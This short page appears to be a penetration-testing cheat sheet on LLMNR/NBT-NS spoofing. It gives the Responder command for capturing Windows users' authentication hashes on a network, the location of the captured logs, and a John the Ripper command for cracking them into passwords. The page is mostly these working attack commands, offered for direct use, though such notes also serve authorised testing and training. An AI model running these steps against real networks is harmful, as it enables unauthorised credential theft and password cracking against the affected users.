---
description: https://www.kali.org/tools/responder/
---

# ↗ Responder LLMNR

## LLMNR / NBT-NS Spoofing

[Responder](https://github.com/lgandx/Responder) : rogue authentication server to capture hashes

This can be used to get the already logged-in user's password, who is trying to access a shared resource which is not present [Step by Step](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)

```
# In Parrot/Kali OS, 
responder -I eth0

# In windows, try to access the shared resource, logs are stored at usr/share/responder/logs/SMB<filename>
# To crack that hash, use JohntheRipper
john SMB<filename>
```

{% embed url="https://www.kali.org/tools/responder/" %}
